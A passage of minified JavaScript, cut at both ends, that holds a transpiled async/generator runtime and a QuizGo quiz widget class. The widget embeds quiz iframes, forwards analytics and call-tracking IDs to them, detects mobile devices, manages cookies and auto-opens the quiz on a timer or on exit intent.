        }(e, n, a), r;
      }
      function l(e, t, n) {
        try {
          return {
            type: "normal",
            arg: e.call(t, n)
          };
        } catch (e) {
          return {
            type: "throw",
            arg: e
          };
        }
      }
      e.wrap = c;
      var u = {};
      function d() {}
      function p() {}
      function h() {}
      var f = {};
      s(f, o, function () {
        return this;
      });
      var b = Object.getPrototypeOf,
        g = b && b(b(z([])));
      g && g !== t && n.call(g, o) && (f = g);
      var m = h.prototype = d.prototype = Object.create(f);
      function v(e) {
        ["next", "throw", "return"].forEach(function (t) {
          s(e, t, function (e) {
            return this._invoke(t, e);
          });
        });
      }
      function w(e, t) {
        function i(o, r, a, s) {
          var c = l(e[o], e, r);
          if ("throw" !== c.type) {
            var u = c.arg,
              d = u.value;
            return d && "object" == Z(d) && n.call(d, "__await") ? t.resolve(d.__await).then(function (e) {
              i("next", e, a, s);
            }, function (e) {
              i("throw", e, a, s);
            }) : t.resolve(d).then(function (e) {
              u.value = e, a(u);
            }, function (e) {
              return i("throw", e, a, s);
            });
          }
          s(c.arg);
        }
        var o;
        this._invoke = function (e, n) {
          function r() {
            return new t(function (t, o) {
              i(e, n, t, o);
            });
          }
          return o = o ? o.then(r, r) : r();
        };
      }
      function y(e, t) {
        var n = e.iterator[t.method];
        if (void 0 === n) {
          if (t.delegate = null, "throw" === t.method) {
            if (e.iterator.return && (t.method = "return", t.arg = void 0, y(e, t), "throw" === t.method)) return u;
            t.method = "throw", t.arg = new TypeError("The iterator does not provide a 'throw' method");
          }
          return u;
        }
        var i = l(n, e.iterator, t.arg);
        if ("throw" === i.type) return t.method = "throw", t.arg = i.arg, t.delegate = null, u;
        var o = i.arg;
        return o ? o.done ? (t[e.resultName] = o.value, t.next = e.nextLoc, "return" !== t.method && (t.method = "next", t.arg = void 0), t.delegate = null, u) : o : (t.method = "throw", t.arg = new TypeError("iterator result is not an object"), t.delegate = null, u);
      }
      function k(e) {
        var t = {
          tryLoc: e[0]
        };
        1 in e && (t.catchLoc = e[1]), 2 in e && (t.finallyLoc = e[2], t.afterLoc = e[3]), this.tryEntries.push(t);
      }
      function x(e) {
        var t = e.completion || {};
        t.type = "normal", delete t.arg, e.completion = t;
      }
      function _(e) {
        this.tryEntries = [{
          tryLoc: "root"
        }], e.forEach(k, this), this.reset(!0);
      }
      function z(e) {
        if (e) {
          var t = e[o];
          if (t) return t.call(e);
          if ("function" == typeof e.next) return e;
          if (!isNaN(e.length)) {
            var i = -1,
              r = function t() {
                for (; ++i < e.length;) if (n.call(e, i)) return t.value = e[i], t.done = !1, t;
                return t.value = void 0, t.done = !0, t;
              };
            return r.next = r;
          }
        }
        return {
          next: q
        };
      }
      function q() {
        return {
          value: void 0,
          done: !0
        };
      }
      return p.prototype = h, s(m, "constructor", h), s(h, "constructor", p), p.displayName = s(h, a, "GeneratorFunction"), e.isGeneratorFunction = function (e) {
        var t = "function" == typeof e && e.constructor;
        return !!t && (t === p || "GeneratorFunction" === (t.displayName || t.name));
      }, e.mark = function (e) {
        return Object.setPrototypeOf ? Object.setPrototypeOf(e, h) : (e.__proto__ = h, s(e, a, "GeneratorFunction")), e.prototype = Object.create(m), e;
      }, e.awrap = function (e) {
        return {
          __await: e
        };
      }, v(w.prototype), s(w.prototype, r, function () {
        return this;
      }), e.AsyncIterator = w, e.async = function (t, n, i, o, r) {
        void 0 === r && (r = U);
        var a = new w(c(t, n, i, o), r);
        return e.isGeneratorFunction(n) ? a : a.next().then(function (e) {
          return e.done ? e.value : a.next();
        });
      }, v(m), s(m, a, "Generator"), s(m, o, function () {
        return this;
      }), s(m, "toString", function () {
        return "[object Generator]";
      }), e.keys = function (e) {
        var t = [];
        for (var n in e) t.push(n);
        return t.reverse(), function n() {
          for (; t.length;) {
            var i = t.pop();
            if (i in e) return n.value = i, n.done = !1, n;
          }
          return n.done = !0, n;
        };
      }, e.values = z, _.prototype = {
        constructor: _,
        reset: function (e) {
          if (this.prev = 0, this.next = 0, this.sent = this._sent = void 0, this.done = !1, this.delegate = null, this.method = "next", this.arg = void 0, this.tryEntries.forEach(x), !e) for (var t in this) "t" === t.charAt(0) && n.call(this, t) && !isNaN(+t.slice(1)) && (this[t] = void 0);
        },
        stop: function () {
          this.done = !0;
          var e = this.tryEntries[0].completion;
          if ("throw" === e.type) throw e.arg;
          return this.rval;
        },
        dispatchException: function (e) {
          if (this.done) throw e;
          var t = this;
          function i(n, i) {
            return a.type = "throw", a.arg = e, t.next = n, i && (t.method = "next", t.arg = void 0), !!i;
          }
          for (var o = this.tryEntries.length - 1; o >= 0; --o) {
            var r = this.tryEntries[o],
              a = r.completion;
            if ("root" === r.tryLoc) return i("end");
            if (r.tryLoc <= this.prev) {
              var s = n.call(r, "catchLoc"),
                c = n.call(r, "finallyLoc");
              if (s && c) {
                if (this.prev < r.catchLoc) return i(r.catchLoc, !0);
                if (this.prev < r.finallyLoc) return i(r.finallyLoc);
              } else if (s) {
                if (this.prev < r.catchLoc) return i(r.catchLoc, !0);
              } else {
                if (!c) throw new Error("try statement without catch or finally");
                if (this.prev < r.finallyLoc) return i(r.finallyLoc);
              }
            }
          }
        },
        abrupt: function (e, t) {
          for (var i = this.tryEntries.length - 1; i >= 0; --i) {
            var o = this.tryEntries[i];
            if (o.tryLoc <= this.prev && n.call(o, "finallyLoc") && this.prev < o.finallyLoc) {
              var r = o;
              break;
            }
          }
          r && ("break" === e || "continue" === e) && r.tryLoc <= t && t <= r.finallyLoc && (r = null);
          var a = r ? r.completion : {};
          return a.type = e, a.arg = t, r ? (this.method = "next", this.next = r.finallyLoc, u) : this.complete(a);
        },
        complete: function (e, t) {
          if ("throw" === e.type) throw e.arg;
          return "break" === e.type || "continue" === e.type ? this.next = e.arg : "return" === e.type ? (this.rval = this.arg = e.arg, this.method = "return", this.next = "end") : "normal" === e.type && t && (this.next = t), u;
        },
        finish: function (e) {
          for (var t = this.tryEntries.length - 1; t >= 0; --t) {
            var n = this.tryEntries[t];
            if (n.finallyLoc === e) return this.complete(n.completion, n.afterLoc), x(n), u;
          }
        },
        catch: function (e) {
          for (var t = this.tryEntries.length - 1; t >= 0; --t) {
            var n = this.tryEntries[t];
            if (n.tryLoc === e) {
              var i = n.completion;
              if ("throw" === i.type) {
                var o = i.arg;
                x(n);
              }
              return o;
            }
          }
          throw new Error("illegal catch attempt");
        },
        delegateYield: function (e, t, n) {
          return this.delegate = {
            iterator: z(e),
            resultName: t,
            nextLoc: n
          }, "next" === this.method && (this.arg = void 0), u;
        }
      }, e;
    }
    function H(e, t, n, i, o, r, a) {
      try {
        var s = e[r](a),
          c = s.value;
      } catch (e) {
        return void n(e);
      }
      s.done ? t(c) : U.resolve(c).then(i, o);
    }
    function J(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, i = new Array(t); n < t; n++) i[n] = e[n];
      return i;
    }
    function Z(e) {
      return Z = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      }, Z(e);
    }
    function K(e, t) {
      if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
    }
    function $(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    function X(e, t, n) {
      return t && $(e.prototype, t), n && $(e, n), Object.defineProperty(e, "prototype", {
        writable: !1
      }), e;
    }
    var ee = function () {
        function e(n) {
          K(this, e), this.AdaptiveHeightMobile = new V(this), this.DefaultParamsService = new B(), this.params = this.DefaultParamsService.getParams(n), this.events = new N(this), this.widgetDom = {}, this.widgetIframeUrl = "", this.preview = !1, this.quizWidgetCreated = !1, this.quizWidgetBlockCreated = !1, window.location.protocol ? ":" === window.location.protocol.slice(-1) ? this.url = window.location.protocol + t.app_url : this.url = window.location.protocol + ":" + t.app_url : this.url = t.app_url, this.version = t.version, this.scrollY = 0, this.sendLeadSuccess = !1, this.widgetUrl = "".concat(this.url, "/q/").concat(this.params.id), this.iframes = [], this.elQuizBlocks = [], this.DuplicationLeads = new I(this);
        }
        var n, i;
        return X(e, [{
          key: "onIframeLoaded",
          value: function (e) {
            !function (e) {
              var t = {
                action: "vuex",
                dispatch: "analytics/quizgo/setPageUrl",
                url: window.location.href
              };
              e.contentWindow.postMessage(JSON.stringify(t), "*");
            }(e), function (e) {
              D(e), window.onRoistatAllModulesLoaded = function () {
                D(e);
              };
            }(e), function (e, t) {
              var n = 0,
                i = setInterval(function () {
                  if (n += 1, void 0 !== window.ct && "on" === (null == t ? void 0 : t.enable) && null != t && t.code) {
                    var o,
                      r = null === (o = window.ct("calltracking_params", t.code)) || void 0 === o ? void 0 : o.sessionId;
                    r && (function (e, t) {
                      var n = {
                        action: "vuex",
                        dispatch: "analytics/calltouch/setSessionId",
                        sessionId: t.sessionId
                      };
                      e.contentWindow.postMessage(JSON.stringify(n), "*");
                    }(e, {
                      sessionId: r
                    }), clearTimeout(i));
                  }
                  n >= 150 && clearTimeout(i);
                }, 100);
            }(e, this.params.calltouch), function (e, t) {
              if (t.enabled && t.id_counter) {
                var n = A("_ga");
                n && n.split(".").length && (n = n.split("."), function (e, t) {
                  var n = {
                    action: "vuex",
                    dispatch: "analytics/ga/setClientID",
                    clientID: t
                  };
                  e.contentWindow.postMessage(JSON.stringify(n), "*");
                }(e, "".concat(n[2], ".").concat(n[3])));
              }
            }(e, this.params.googleAnalitics), function (e, t) {
              if ("undefined" == typeof ym || !t.enabled || !t.id_metrika) return !1;
              window.ym(t.id_metrika, "getClientID", function (t) {
                return function (e, t) {
                  var n = {
                    action: "vuex",
                    dispatch: "analytics/metrika/setClientID",
                    clientID: t
                  };
                  e.contentWindow.postMessage(JSON.stringify(n), "*");
                }(e, t);
              });
            }(e, this.params.yandexMetrika), window.onQuizGoLoaded && window.onQuizGoLoaded(this), e.contentWindow.postMessage({
              eventQuizGo: "onOpenQuiz"
            }, "*"), this.DuplicationLeads.setTimestampInWidget();
          }
        }, {
          key: "isIFrame",
          value: function () {
            var e = !1;
            try {
              e = window != window.top || document != top.document || self.location != top.location;
            } catch (t) {
              e = !0;
            }
            return e;
          }
        }, {
          key: "mobileAndTabletCheck",
          value: function () {
            var e,
              t = !1;
            return e = navigator.userAgent || navigator.vendor || window.opera, (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(e) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(e.substr(0, 4))) && (t = !0), t;
          }
        }, {
          key: "getCoMagicSessionIDParams",
          value: function () {
            var e = "";
            return "object" === ("undefined" == typeof Comagic ? "undefined" : Z(Comagic)) && window.Comagic.getSessionId() && (e = "&comagic_session_id=".concat(window.Comagic.getSessionId())), e;
          }
        }, {
          key: "getVersionScript",
          value: function () {
            return "&version=".concat(this.version);
          }
        }, {
          key: "getWindowLocationSearch",
          value: function () {
            var e = window.location.search.replace(/\?/g, "");
            return "&".concat(e);
          }
        }, {
          key: "getNoStatic",
          value: function () {
            return this.params.noStatic ? "&noStatic=noStatic" : "";
          }
        }, {
          key: "setIframeQuizWidgetUrl",
          value: function () {
            var e,
              t = this.params.setupDomain ? this.params.domainQuiz : this.widgetUrl;
            return e = "".concat(t, "?"), e += this.getNoStatic(), e += this.getVersionScript(), e += this.getWindowLocationSearch(), e += this.getCoMagicSessionIDParams(), e += "&setup-iframe=on", this.params.preview && (e += "&preview=on"), this.widgetIframeUrl = e, this;
          }
        }, {
          key: "createQuizWidgetDom",
          value: function () {
            var e = this,
              t = {};
            return t.bQuizgoWrapper = document.createElement("div"), t.bQuizgoWrapper.className = "b-quizgo-wrapper b-quizgo-wrapper__".concat(this.params.id), t.bQuizgoWrapper.onclick = function () {
              e.close();
            }, t.bQuizgoModal = document.createElement("div"), t.bQuizgoModal.className = "b-quizgo-modal", t.bQuizStart = document.createElement("div"), t.bQuizStart.className = "b-quiz-start", t.bQuizIconClose = document.createElement("div"), t.bQuizIconClose.className = "b-quiz-icon-close", t.quizgoIframeWidget = document.createElement("iframe"), t.quizgoIframeWidget.setAttribute("id", "quizgo-iframe-widget-".concat(this.params.id)), t.quizgoIframeWidget.setAttribute("src", this.widgetIframeUrl), t.quizgoIframeWidget.addEventListener("load", function () {
              t.bQuizStart.style.display = "none", e.onIframeLoaded(t.quizgoIframeWidget);
            }), t.loader = document.createElement("img"), t.loader.setAttribute("src", "//panel.quizgo.ru/assets/dashboard/build/img/loading-widget.gif"), t.bQuizStart.appendChild(t.loader), t.bQuizgoModal.appendChild(t.bQuizStart), t.bQuizgoModal.appendChild(t.bQuizIconClose), t.bQuizgoModal.appendChild(t.quizgoIframeWidget), t.bQuizgoWrapper.appendChild(t.bQuizgoModal), t;
          }
        }, {
          key: "createQuizWidgetBlockDom",
          value: function (e) {
            var t = this,
              n = {},
              i = (Math.random() + 1).toString().replace(".", "");
            return n.bQuizgoWrapper = document.createElement("div"), n.bQuizgoWrapper.className = "b-quizgo-wrapper__inner-block b-quizgo-wrapper__".concat(this.params.id, " block-id-").concat(i), n.bQuizgoWrapper.onclick = function () {
              t.close();
            }, n.quizgoIframeWidget = document.createElement("iframe"), n.quizgoIframeWidget.setAttribute("id", "quizgo-iframe-widget-".concat(e, "-").concat(this.params.id)), n.quizgoIframeWidget.setAttribute("src", "".concat(this.widgetIframeUrl, "&inner-block=on&block-id=").concat(i)), n.quizgoIframeWidget.addEventListener("load", function () {
              t.onIframeLoaded(n.quizgoIframeWidget);
            }), this.params.setupBlock.buttonOnMobile && n.bQuizgoWrapper.classList.add("b-quizgo__button-on-mobile"), n.bQuizgoWrapper.appendChild(n.quizgoIframeWidget), n;
          }
        }, {
          key: "createQuizWidgetModal",
          value: function () {
            return this.quizWidgetCreated || (this.widgetDom = this.createQuizWidgetDom(), document.body.appendChild(this.widgetDom.bQuizgoWrapper), this.quizWidgetCreated = !0), this;
          }
        }, {
          key: "createBtnShowWidget",
          value: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {
                display: !1
              },
              t = {};
            return t.button = document.createElement("button"), t.button.classList.add("b-quizgo-button-show-quiz"), t.button.innerText = this.params.setupBlock.button.text, t.button.style.borderRadius = "".concat(this.params.setupBlock.button.radius, "px"), t.button.style.color = this.params.setupBlock.button.textColor, t.button.style.backgroundColor = this.params.setupBlock.button.backgroundColor, t.button.style.borderColor = this.params.setupBlock.button.backgroundColor, e.display && (t.button.style.display = "block"), this.params.setupBlock.button.shadow && (t.button.style.boxShadow = "1.5px 5.7px 21px 0 ".concat(this.params.setupBlock.button.backgroundColor)), t.button.setAttribute("onclick", "QuizGoWidget".concat(this.params.id, ".show()")), t;
          }
        }, {
          key: "createQuizWidgetPreview",
          value: function () {
            var e = this,
              t = document.querySelectorAll(".b-quiz-builder__preview-widget");
            if (t.length < 1 || !this.params.preview) return this;
            var n = document.createElement("iframe");
            return n.setAttribute("src", this.widgetIframeUrl), n.onload = function () {
              e.params.on && e.params.on.load && e.params.on.load(e);
            }, this.iframes.push(n), t[0].appendChild(n), this;
          }
        }, {
          key: "createQuizWidgetBlock",
          value: function () {
            var e = this;
            if (this.quizWidgetBlockCreated) return this;
            if (this.elQuizBlocks = this.params.openSelector ? "".concat(this.params.openSelector, ", ") : "", this.elQuizBlocks = document.querySelectorAll("".concat(this.elQuizBlocks, " .js-quizgo-quiz-block-").concat(this.params.id)), this.elQuizBlocks.length < 1) return this;
            if (this.mobileAndTabletCheck()) {
              if (this.params.setupBlock.hideOnMobile) return this.elQuizBlocks.forEach(function (e) {
                e.style.display = "none";
              }), !1;
              if (this.params.setupBlock.buttonOnMobile) return this.elQuizBlocks.forEach(function (t) {
                t.style.height = "auto", t.appendChild(e.createBtnShowWidget({
                  display: "inline-block"
                }).button);
              }), this;
            }
            return this.elQuizBlocks.forEach(function (t, n) {
              var i = e.createQuizWidgetBlockDom(n);
              e.params.setupBlock.buttonOnMobile && t.appendChild(e.createBtnShowWidget().button), t.appendChild(i.bQuizgoWrapper);
            }), this.quizWidgetBlockCreated = !0, this;
          }
        }, {
          key: "eventClickOpenSelector",
          value: function () {
            var e,
              t,
              n = this;
            return t = !1, this.params.openSelector && (e = document.querySelectorAll('[href="'.concat(this.params.openSelector, '"]'))).length ? (e.forEach(function (e) {
              t = !0, e.addEventListener("click", function (e) {
                e.preventDefault(), e.stopPropagation(), n.show();
              });
            }), t) : t;
          }
        }, {
          key: "eventListennerClickOpenSelector",
          value: function () {
            var e,
              t = this;
            this.eventClickOpenSelector() || (e = setInterval(function () {
              t.eventClickOpenSelector() && clearTimeout(e);
            }, 300));
          }
        }, {
          key: "setEventsAutoOpen",
          value: function () {
            this.params.autoOpen && !this.isIFrame() && (this.params.autoOpenNameCookie && this.params.autoOpenTimeCookie ? ("remember" !== this.getCookie(this.params.autoOpenNameCookie) && this.onAutoOpenQuiz(), this.setCookie(this.params.autoOpenNameCookie, "remember", {
              expires: 60 * this.params.autoOpenTimeCookie,
              path: "/"
            })) : this.onAutoOpenQuiz());
          }
        }, {
          key: "setEventOpenBeforeClose",
          value: function () {
            var e = this;
            this.params.openBeforeClose && !this.isIFrame() && (window.addEventListener("message", function (t) {
              "onSendLeadSuccess" === t.data && (e.sendLeadSuccess = !0);
            }), this.params.openBeforeCloseTimeCookie && this.params.openBeforeCloseNameCookie ? ("remember" !== this.getCookie(this.params.openBeforeCloseNameCookie) && (document.onmouseout = function (t) {
              if (!e.tabCloseOpen) return t.clientY < 7 && !e.sendLeadSuccess ? (e.show({
                initial: "code"
              }), e.tabCloseOpen = !0, !0) : void 0;
            }), this.setCookie(this.params.openBeforeCloseNameCookie, "remember", {
              expires: 60 * this.params.openBeforeCloseTimeCookie,
              path: "/"
            })) : document.onmouseout = function (t) {
              if (!e.tabCloseOpen) return t.clientY < 7 && !e.sendLeadSuccess ? (e.show({
                initial: "code"
              }), e.tabCloseOpen = !0, !0) : void 0;
            });
          }
        }, {
          key: "onAutoOpenQuiz",
          value: function () {
            var e = this;
            void 0 !== this.params.autoOpenDelay && this.params.autoOpenDelay > 0 ? setTimeout(function () {
              return e.show({
                initial: "code"
              });
            }, 1e3 * this.params.autoOpenDelay) : setTimeout(function () {
              return e.show({
                initial: "code"
              });
            }, 2e3);
          }
        }, {
          key: "getCookie",
          value: function (e) {
            var t = document.cookie.match(new RegExp("(?:^|; )".concat(e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1"), "=([^;]*)")));
            return t ? decodeURIComponent(t[1]) : void 0;
          }
        }, {
          key: "setCookie",
          value: function (e, t, n) {
            var i = (n = n || {}).expires;
            if ("number" == typeof i && i) {
              var o = new Date();
              o.setTime(o.getTime() + 1e3 * i), i = n.expires = o;
            }
            i && i.toUTCString && (n.expires = i.toUTCString()), t = encodeURIComponent(t);
            var r = "".concat(e, "=").concat(t);
            for (var a in n) {
              r += "; ".concat(a);
              var s = n[a];
              !0 !== s && (r += "=".concat(s));
            }
            document.cookie = r;
          }
        }, {
          key: "getRoistatVisitUrlParam",
          value: function () {
            var e = this.getCookie("roistat_visit");
            return e ? "&roistat_visit=".concat(e) : "&dd";
          }
        }, {
          key: "getUrlWidgetRedirect",
          value: function () {
            var e = this.params.domainQuiz ? this.params.domainQuiz : this.widgetUrl;
            e.indexOf("?") + 1 ? e += window.location.search.replace("?", "&") : e += window.location.search;
            var t = window.location.href.replace(/\?/g, "[*]");
            return t = t.replace(/\#/g, "[^]"), e.indexOf("?") + 1 ? e += "&event_open=y&windowLocation=".concat(t) : e += "?event_open=y&windowLocation=".concat(t), e + this.getRoistatVisitUrlParam();
          }
        }, {
          key: "show",
          value: function () {
            var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {
                initial: "user"
              },
              t = this.iosDetect();
            return "user" === e.initial && t.ios && t.version < 13 ? (window.location.href = this.getUrlWidgetRedirect(), this) : (this.scrollY = window.scrollY, document.body.style.top = "-".concat(this.scrollY, "px"), document.body.classList.add("b-quizgo-widget-blocked-body"), this.createQuizWidgetModal(), this.widgetDom.bQuizgoWrapper && (this.widgetDom.bQuizgoWrapper.style.display = "flex", R(this), this.events.eventOpen()), this);
          }
        }, {
          key: "close",
          value: function () {
            var e = document.querySelectorAll(".b-quizgo-wrapper__".concat(this.params.id, ":not(.b-quizgo-wrapper__inner-block)"));
            e.length && (e[0].style.display = "none", function (e) {
              try {
                e.mobileAndTabletCheck() && (G.show(), F.show());
              } catch (e) {
                console.error("error Support Chats", e);
              }
            }(this), this.events.eventClose(), this.widgetDom.quizgoIframeWidget.contentWindow.postMessage({
              eventQuizGo: "onCloseQuiz"
            }, "*"), document.body.classList.remove("b-quizgo-widget-blocked-body"), document.body.style.top = "", window.scrollTo(0, this.scrollY));
          }
        }, {
          key: "isMobile",
          value: function () {
            var e,
              t = !1;
            return e = navigator.userAgent || navigator.vendor || window.opera, (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(e) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(e.substr(0, 4))) && (t = !0), t;
          }
        }, {
          key: "iosDetect",
          value: function () {
            var e = {
              ios: !1,
              version: !1
            };
            if (/iP(hone|od|ad)/.test(navigator.platform)) {
              var t = navigator.appVersion.match(/OS (\d+)_(\d+)_?(\d+)?/);
              e.ios = !0, e.version = parseInt(t[1], 10);
            }
            return e;
          }
        }, {
          key: "pSBC",
          value: function (e, t, n, i) {
            var o,
              r,
              a,
              s,
              c,
              l,
              u,
              d = parseInt,
              p = Math.round,
              h = "string" == typeof n;
            return "number" != typeof e || e < -1 || e > 1 || "string" != typeof t || "r" != t[0] && "#" != t[0] || n && !h ? null : (this.pSBCr || (this.pSBCr = function (e) {
              var t = e.length,
                n = {};
              if (t > 9) {
                var i;
                if (i = function (e, t) {
                  return function (e) {
                    if (Array.isArray(e)) return e;
                  }(e) || function (e, t) {
                    var n = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
                    if (null != n) {
                      var i,
                        o,
                        r = [],
                        a = !0,
                        s = !1;
                      try {
                        for (n = n.call(e); !(a = (i = n.next()).done) && (r.push(i.value), !t || r.length !== t); a = !0);
                      } catch (e) {
                        s = !0, o = e;
                      } finally {
                        try {
                          a || null == n.return || n.return();
                        } finally {
                          if (s) throw o;
                        }
                      }
                      return r;
                    }
                  }(e, t) || function (e, t) {
                    if (e) {
                      if ("string" == typeof e) return J(e, t);
                      var n = Object.prototype.toString.call(e).slice(8, -1);
                      return "Object" === n && e.constructor && (n = e.constructor.name), "Map" === n || "Set" === n ? Array.from(e) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? J(e, t) : void 0;
                    }
                  }(e, t) || function () {
                    throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
                  }();
                }(e = e.split(","), 4), o = i[0], r = i[1], a = i[2], h = i[3], (t = e.length) < 3 || t > 4) return null;
                n.r = d("a" == o[3] ? o.slice(5) : o.slice(4)), n.g = d(r), n.b = d(a), n.a = h ? parseFloat(h) : -1;
              } else {
                if (8 == t || 6 == t || t < 4) return null;
                t < 6 && (e = "#" + e[1] + e[1] + e[2] + e[2] + e[3] + e[3] + (t > 4 ? e[4] + e[4] : "")), e = d(e.slice(1), 16), 9 == t || 5 == t ? (n.r = e >> 24 & 255, n.g = e >> 16 & 255, n.b = e >> 8 & 255, n.a = p((255 & e) / .255) / 1e3) : (n.r = e >> 16, n.g = e >> 8 & 255, n.b = 255 & e, n.a = -1);
              }
              return n;
